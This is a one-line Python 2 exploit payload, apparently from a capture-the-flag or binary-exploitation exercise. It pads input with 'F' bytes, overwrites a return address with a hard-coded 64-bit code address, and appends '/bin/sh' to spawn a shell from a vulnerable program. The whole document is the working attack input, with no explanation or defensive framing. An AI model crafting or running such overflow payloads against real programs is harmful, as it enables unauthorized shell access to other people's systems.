print 40*"F" + "\xff\n" + 200*"F" + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "/bin/sh\n"
